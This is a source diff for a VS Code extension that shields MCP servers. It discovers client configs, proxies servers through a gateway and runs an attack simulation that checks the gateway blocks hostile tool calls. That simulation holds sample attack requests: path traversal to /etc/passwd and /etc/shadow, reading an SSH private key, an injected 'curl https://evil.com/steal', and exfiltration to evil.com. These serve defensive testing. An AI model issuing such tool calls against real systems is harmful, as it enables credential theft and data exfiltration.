@@ -457,3 +457,592 @@ function getDatabasePath(context: vscode.ExtensionContext): string {
 
   return path.join(context.globalStorageUri.fsPath, "mcp-shield.db");
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// MCP client configuration discovery
+// ─────────────────────────────────────────────────────────────────────────────
+
+export interface DetectedServer {
+  id: string;
+  transport: "stdio" | "http";
+  command: string;
+  args: string[];
+  url?: string;
+  proxyPort?: number;
+  isShielded: boolean;
+}
+
+export interface DetectedConfig {
+  name: string;
+  path: string;
+  servers: DetectedServer[];
+}
+
+/**
+ * Well-known MCP client config locations.
+ *
+ * These paths are the integration surface of the whole project, and they are the
+ * part most likely to rot: each client vendor picks its own location and can move
+ * it between releases. Keeping them in one table makes that maintenance visible.
+ */
+function candidateConfigPaths(): { name: string; path: string }[] {
+  const home = process.env.HOME || process.env.USERPROFILE || "";
+  const appData = process.env.APPDATA || "";
+  const win = process.platform === "win32";
+  const mac = process.platform === "darwin";
+
+  const vsCodeGlobalStorage = (publisher: string, file: string) =>
+    win
+      ? path.join(appData, "Code", "User", "globalStorage", publisher, "settings", file)
+      : mac
+      ? path.join(home, "Library", "Application Support", "Code", "User", "globalStorage", publisher, "settings", file)
+      : path.join(home, ".config", "Code", "User", "globalStorage", publisher, "settings", file);
+
+  return [
+    {
+      name: "Claude Desktop",
+      path: win
+        ? path.join(appData, "Claude", "claude_desktop_config.json")
+        : mac
+        ? path.join(home, "Library", "Application Support", "Claude", "claude_desktop_config.json")
+        : path.join(home, ".config", "Claude", "claude_desktop_config.json"),
+    },
+    {
+      name: "Cline",
+      path: vsCodeGlobalStorage("saoudrizwan.claude-dev", "cline_mcp_settings.json"),
+    },
+    {
+      name: "Roo Code",
+      path: vsCodeGlobalStorage("rooveterinaryinc.roo-cline", "mcp_settings.json"),
+    },
+    {
+      name: "Cursor",
+      path: path.join(home, ".cursor", "mcp.json"),
+    },
+    {
+      name: "Windsurf",
+      path: path.join(home, ".codeium", "windsurf", "mcp_config.json"),
+    },
+  ];
+}
+
+/**
+ * Read every known config file and report the servers it declares, noting which
+ * are already shielded.
+ *
+ * Detection of "already shielded" works by recognising our own rewrite: for stdio
+ * the command is `node` with `gateway.js` as the first argument, and for HTTP we
+ * leave an `_mcpShieldUpstream` marker holding the original URL. That marker is
+ * also what makes unshielding lossless.
+ */
+export function scanMcpConfigs(context: vscode.ExtensionContext): DetectedConfig[] {
+  const results: DetectedConfig[] = [];
+
+  for (const candidate of candidateConfigPaths()) {
+    if (!fs.existsSync(candidate.path)) continue;
+
+    try {
+      const parsed = JSON.parse(fs.readFileSync(candidate.path, "utf8"));
+      // Different clients nest the map under different keys.
+      const servers = parsed.mcpServers || parsed.servers || {};
+      const detected: DetectedServer[] = [];
+
+      for (const serverId of Object.keys(servers)) {
+        const entry = servers[serverId];
+        if (!entry || typeof entry !== "object") continue;
+
+        // ── HTTP / SSE ──────────────────────────────────────────────────────
+        if (entry.url) {
+          const isShielded = Boolean(entry._mcpShieldUpstream);
+          detected.push({
+            id: serverId,
+            transport: "http",
+            command: "",
+            args: [],
+            url: isShielded ? entry._mcpShieldUpstream : entry.url,
+            proxyPort: entry._mcpShieldProxyPort,
+            isShielded,
+          });
+          continue;
+        }
+
+        // ── stdio ───────────────────────────────────────────────────────────
+        const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
+        let isShielded = false;
+        let originalCommand = entry.command ?? "";
+        let originalArgs = [...argsList];
+
+        if (entry.command === "node" && argsList.length > 0 && argsList[0].includes("gateway.js")) {
+          isShielded = true;
+          const separatorIdx = argsList.indexOf("--");
+          if (separatorIdx !== -1 && separatorIdx + 1 < argsList.length) {
+            originalCommand = argsList[separatorIdx + 1];
+            originalArgs = argsList.slice(separatorIdx + 2);
+          }
+        }
+
+        detected.push({
+          id: serverId,
+          transport: "stdio",
+          command: originalCommand,
+          args: originalArgs,
+          isShielded,
+        });
+      }
+
+      results.push({ name: candidate.name, path: candidate.path, servers: detected });
+    } catch (err: any) {
+      log(`Failed to parse ${candidate.path}: ${err.message}`);
+    }
+  }
+
+  return results;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Shielding / unshielding
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * Insert or remove the shield for one server by rewriting the client's config.
+ *
+ * A timestamped backup is written before every edit. The original overwrote a
+ * single `.bak` file each time, so two toggles destroyed the only copy of the
+ * user's original configuration.
+ */
+async function toggleShieldServer(
+  context: vscode.ExtensionContext,
+  configPath: string,
+  serverId: string,
+  shield: boolean
+): Promise<{ ok: boolean; message: string }> {
+  if (!fs.existsSync(configPath)) {
+    return { ok: false, message: `Config file no longer exists: ${configPath}` };
+  }
+
+  try {
+    const raw = fs.readFileSync(configPath, "utf8");
+    const parsed = JSON.parse(raw);
+    const servers = parsed.mcpServers || parsed.servers;
+    if (!servers || !servers[serverId]) {
+      return { ok: false, message: `Server '${serverId}' not found in ${configPath}` };
+    }
+
+    // Timestamped backup so history is preserved across repeated toggles.
+    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
+    try {
+      fs.writeFileSync(`${configPath}.${stamp}.bak`, raw, "utf8");
+    } catch (err: any) {
+      // Refuse to edit if we cannot back up first.
+      return { ok: false, message: `Could not write a backup, aborting: ${err.message}` };
+    }
+
+    const entry = servers[serverId];
+    const proxyKey = `${configPath}::${serverId}`;
+
+    if (entry.url) {
+      // ── HTTP transport ────────────────────────────────────────────────────
+      const gatewayHttpPath = path.join(context.extensionPath, "dist", "gateway-http.js");
+
+      if (shield) {
+        if (entry._mcpShieldUpstream) {
+          return { ok: true, message: `'${serverId}' is already shielded.` };
+        }
+        const upstreamUrl: string = entry.url;
+        const port = await allocateProxyPort();
+
+        entry._mcpShieldUpstream = upstreamUrl;
+        entry._mcpShieldProxyPort = port;
+        entry.url = `http://127.0.0.1:${port}`;
+
+        fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");
+
+        // The extension must actually run the proxy. The original wrote a
+        // `_mcpShieldHttpLauncher` array into the config and nothing ever
+        // executed it, so "shielded" HTTP servers pointed at a dead port.
+        const started = startHttpProxy(context, configPath, serverId, upstreamUrl, port);
+        if (!started) {
+          return {
+            ok: false,
+            message: `Config updated but the HTTP proxy failed to start. Check the MCP Shield output channel. Expected ${gatewayHttpPath} to exist — run 'npm run build' if developing.`,
+          };
+        }
+        return {
+          ok: true,
+          message: `'${serverId}' shielded. Traffic now flows through 127.0.0.1:${port}. Restart your MCP client.`,
+        };
+      }
+
+      // Unshield
+      if (entry._mcpShieldUpstream) {
+        entry.url = entry._mcpShieldUpstream;
+        delete entry._mcpShieldUpstream;
+        delete entry._mcpShieldProxyPort;
+        // Remove the dead key written by earlier versions.
+        delete entry._mcpShieldHttpLauncher;
+      }
+      fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");
+      stopHttpProxy(proxyKey);
+      return { ok: true, message: `'${serverId}' unshielded. Restart your MCP client.` };
+    }
+
+    // ── stdio transport ─────────────────────────────────────────────────────
+    const gatewayPath = path.join(context.extensionPath, "dist", "gateway.js");
+
+    if (shield) {
+      const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
+      if (entry.command === "node" && argsList[0]?.includes("gateway.js")) {
+        return { ok: true, message: `'${serverId}' is already shielded.` };
+      }
+      if (!fs.existsSync(gatewayPath)) {
+        return {
+          ok: false,
+          message: `Gateway bundle missing at ${gatewayPath}. Run 'npm run build'.`,
+        };
+      }
+
+      entry.args = [
+        gatewayPath,
+        "--server",
+        serverId,
+        "--db",
+        dbPathGlobal,
+        "--",
+        entry.command,
+        ...argsList,
+      ];
+      entry.command = "node";
+    } else {
+      const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
+      if (entry.command === "node" && argsList[0]?.includes("gateway.js")) {
+        const separatorIdx = argsList.indexOf("--");
+        if (separatorIdx !== -1 && separatorIdx + 1 < argsList.length) {
+          entry.command = argsList[separatorIdx + 1];
+          entry.args = argsList.slice(separatorIdx + 2);
+        }
+      }
+    }
+
+    fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");
+    return {
+      ok: true,
+      message: `'${serverId}' ${shield ? "shielded" : "unshielded"}. Restart your MCP client to apply.`,
+    };
+  } catch (err: any) {
+    log(`toggleShield failed for ${serverId}: ${err.message}`);
+    return { ok: false, message: err.message };
+  }
+}
+
+/**
+ * Find a free loopback port.
+ *
+ * The original returned `3100 + random(900)` with no availability check, so two
+ * shielded servers could collide and the second proxy would die on EADDRINUSE.
+ * Binding port 0 lets the OS pick a port it knows is free.
+ */
+function allocateProxyPort(): Promise<number> {
+  return new Promise((resolve, reject) => {
+    const probe = net.createServer();
+    probe.unref();
+    probe.on("error", reject);
+    probe.listen(0, "127.0.0.1", () => {
+      const address = probe.address();
+      const port = typeof address === "object" && address ? address.port : 0;
+      probe.close(() => (port ? resolve(port) : reject(new Error("Could not allocate a port"))));
+    });
+  });
+}
+
+/** Spawn and supervise an HTTP proxy child for one shielded server. */
+function startHttpProxy(
+  context: vscode.ExtensionContext,
+  configPath: string,
+  serverId: string,
+  upstreamUrl: string,
+  port: number
+): boolean {
+  const key = `${configPath}::${serverId}`;
+  if (httpProxies.has(key)) return true;
+
+  const gatewayHttpPath = path.join(context.extensionPath, "dist", "gateway-http.js");
+  if (!fs.existsSync(gatewayHttpPath)) {
+    log(`Cannot start HTTP proxy: ${gatewayHttpPath} not found`);
+    return false;
+  }
+
+  try {
+    const child = spawn(
+      process.execPath,
+      [
+        gatewayHttpPath,
+        "--server", serverId,
+        "--db", dbPathGlobal,
+        "--upstream", upstreamUrl,
+        "--port", String(port),
+      ],
+      // shell: false for the same reason the stdio gateway uses it — a server id
+      // or URL containing shell metacharacters must never reach a shell.
+      { stdio: ["ignore", "pipe", "pipe"], shell: false }
+    );
+
+    child.stdout?.on("data", (d) => log(`[http-proxy ${serverId}] ${d.toString().trim()}`));
+    child.stderr?.on("data", (d) => log(`[http-proxy ${serverId}] ${d.toString().trim()}`));
+    child.on("exit", (code) => {
+      log(`HTTP proxy for '${serverId}' exited with code ${code}`);
+      httpProxies.delete(key);
+    });
+
+    httpProxies.set(key, child);
+    log(`Started HTTP proxy for '${serverId}' on 127.0.0.1:${port} → ${upstreamUrl}`);
+    return true;
+  } catch (err: any) {
+    log(`Failed to spawn HTTP proxy for '${serverId}': ${err.message}`);
+    return false;
+  }
+}
+
+function stopHttpProxy(key: string) {
+  const child = httpProxies.get(key);
+  if (!child) return;
+  try {
+    child.kill();
+  } catch {
+    /* already gone */
+  }
+  httpProxies.delete(key);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Attack simulation
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * Run a deliberately hostile MCP server through the real gateway and report what
+ * was blocked.
+ *
+ * This is a genuine end-to-end exercise, not a mock: it spawns `dist/gateway.js`
+ * as a subprocess with the bundled malicious server as its target, speaks real
+ * JSON-RPC over its stdio, and asserts on the actual replies. Everything the
+ * shield does in production — policy evaluation, audit writes, tool-description
+ * sanitization — happens here too, which is what makes it worth trusting as a
+ * demonstration.
+ *
+ * The demo server is forced into Strict mode first so nothing waits on a modal.
+ */
+async function runAttackDemo(context: vscode.ExtensionContext, dbPath: string) {
+  const gatewayPath = path.join(context.extensionPath, "dist", "gateway.js");
+  const evilServerPath = path.join(context.extensionPath, "resources", "demo-evil-server.js");
+
+  for (const [label, p] of [["gateway", gatewayPath], ["demo server", evilServerPath]] as const) {
+    if (!fs.existsSync(p)) {
+      vscode.window.showErrorMessage(
+        `MCP Shield: cannot run the demo, ${label} bundle missing at ${p}. Run 'npm run build'.`
+      );
+      return;
+    }
+  }
+
+  const demoServerId = "mcp-shield-demo";
+  await savePolicy(dbInstance, {
+    server_id: demoServerId,
+    mode: "Strict",
+    readonly: 0,
+    allowed_paths: JSON.stringify([context.extensionPath]),
+    allowed_domains: JSON.stringify(["api.github.com"]),
+    disabled_tools: JSON.stringify(["delete_file"]),
+    status: "Shielded",
+    max_payload_kb: 0,
+    block_secrets: 1,
+    deny_unlisted_domains: 0,
+    scan_results: 1,
+  });
+
+  outputChannel?.show(true);
+  log("═".repeat(72));
+  log("MCP SHIELD — LIVE ATTACK SIMULATION");
+  log("Spawning the real gateway with a malicious MCP server as its target.");
+  log("═".repeat(72));
+
+  await vscode.window.withProgress(
+    { location: vscode.ProgressLocation.Notification, title: "MCP Shield: running attack simulation", cancellable: false },
+    async () => {
+      const result = await executeAttackScenarios(gatewayPath, evilServerPath, demoServerId, dbPath);
+
+      log("");
+      log("─".repeat(72));
+      log(`RESULT: ${result.blocked} of ${result.total} attacks blocked.`);
+      log("─".repeat(72));
+
+      const allBlocked = result.blocked === result.total;
+      const message = `MCP Shield blocked ${result.blocked}/${result.total} simulated attacks.`;
+      if (allBlocked) {
+        vscode.window.showInformationMessage(message, "Open Dashboard").then((choice) => {
+          if (choice === "Open Dashboard") DashboardPanel.createOrShow(context, dbPath);
+        });
+      } else {
+        vscode.window.showWarningMessage(
+          `${message} See the MCP Shield output channel for the ones that got through.`
+        );
+      }
+    }
+  );
+}
+
+interface AttackCase {
+  name: string;
+  threat: string;
+  request: Record<string, unknown>;
+}
+
+async function executeAttackScenarios(
+  gatewayPath: string,
+  evilServerPath: string,
+  serverId: string,
+  dbPath: string
+): Promise<{ blocked: number; total: number }> {
+  const attacks: AttackCase[] = [
+    {
+      name: "Path traversal to /etc/passwd",
+      threat: "T-02",
+      request: { name: "get_data", arguments: { path: "../../../../etc/passwd" } },
+    },
+    {
+      name: "Absolute path escape to SSH private key",
+      threat: "T-02",
+      request: { name: "get_data", arguments: { path: "/home/victim/.ssh/id_rsa" } },
+    },
+    {
+      name: "Command injection via shell metacharacter",
+      threat: "T-04",
+      request: { name: "run_command", arguments: { cmd: "ls; curl https://evil.com/steal" } },
+    },
+    {
+      name: "Data exfiltration to an unlisted domain",
+      threat: "T-05",
+      request: { name: "fetch_url", arguments: { url: "https://evil.com/collect" } },
+    },
+    {
+      name: "AWS credential exfiltration in arguments",
+      threat: "T-07",
+      request: {
+        name: "fetch_url",
+        arguments: { url: "https://api.github.com/x", body: "AKIAIOSFODNN7EXAMPLE" },
+      },
+    },
+    {
+      name: "Explicitly denylisted tool",
+      threat: "T-06",
+      request: { name: "delete_file", arguments: { path: "notes.txt" } },
+    },
+    {
+      name: "Batch-wrapped call (bypass attempt)",
+      threat: "T-08",
+      request: { name: "__BATCH__", arguments: {} },
+    },
+  ];
+
+  return new Promise((resolve) => {
+    const child = spawn(
+      process.execPath,
+      [gatewayPath, "--server", serverId, "--db", dbPath, "--", process.execPath, evilServerPath],
+      { stdio: ["pipe", "pipe", "pipe"], shell: false }
+    );
+
+    let blocked = 0;
+    let buffer = "";
+    const pending = new Map<number, AttackCase>();
+    let settled = false;
+
+    const finish = () => {
+      if (settled) return;
+      settled = true;
+      try {
+        child.kill();
+      } catch {
+        /* already gone */
+      }
+      resolve({ blocked, total: attacks.length });
+    };
+
+    child.stderr?.on("data", (d) => {
+      const text = d.toString().trim();
+      if (text) log(`  [gateway stderr] ${text}`);
+    });
+
+    child.stdout?.on("data", (chunk) => {
+      buffer += chunk.toString("utf8");
+      let idx;
+      while ((idx = buffer.indexOf("\n")) !== -1) {
+        const line = buffer.substring(0, idx).trim();
+        buffer = buffer.substring(idx + 1);
+        if (!line) continue;
+
+        try {
+          const msg = JSON.parse(line);
+          // A batch attempt is answered with an array of errors.
+          const frames = Array.isArray(msg) ? msg : [msg];
+
+          for (const frame of frames) {
+            const attack = pending.get(frame.id);
+            if (!attack) continue;
+            pending.delete(frame.id);
+
+            if (frame.error) {
+              blocked++;
+              log("");
+              log(`  ✓ BLOCKED  [${attack.threat}] ${attack.name}`);
+              log(`             ${frame.error.message}`);
+            } else {
+              log("");
+              log(`  ✗ ALLOWED  [${attack.threat}] ${attack.name}`);
+              log(`             Server replied: ${JSON.stringify(frame.result).slice(0, 200)}`);
+            }
+          }
+
+          if (pending.size === 0 && sent) finish();
+        } catch {
+          /* not a JSON frame */
+        }
+      }
+    });
+
+    child.on("error", (err) => {
+      log(`  Demo gateway failed to start: ${err.message}`);
+      finish();
+    });
+
+    let sent = false;
+    const write = (payload: unknown) => child.stdin?.write(JSON.stringify(payload) + "\n");
+
+    // Handshake, then list tools so the sanitizer and capability cache run.
+    write({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2024-11-05", capabilities: {} } });
+    write({ jsonrpc: "2.0", id: 2, method: "tools/list", params: {} });
+
+    setTimeout(() => {
+      attacks.forEach((attack, i) => {
+        const id = 100 + i;
+        pending.set(id, attack);
+
+        if (attack.request.name === "__BATCH__") {
+          // The bypass attempt: wrap a blocked call in a JSON-RPC array. An array
+          // has no `.method`, which is why the original forwarded it unexamined.
+          write([
+            {
+              jsonrpc: "2.0",
+              id,
+              method: "tools/call",
+              params: { name: "get_data", arguments: { path: "/etc/shadow" } },
+            },
+          ]);
+        } else {
+          write({ jsonrpc: "2.0", id, method: "tools/call", params: attack.request });
+        }
+      });
+      sent = true;
+    }, 600);
+
+    // Hard stop so a hung child cannot leave the progress notification spinning.
+    setTimeout(finish, 15000);
+  });
+}
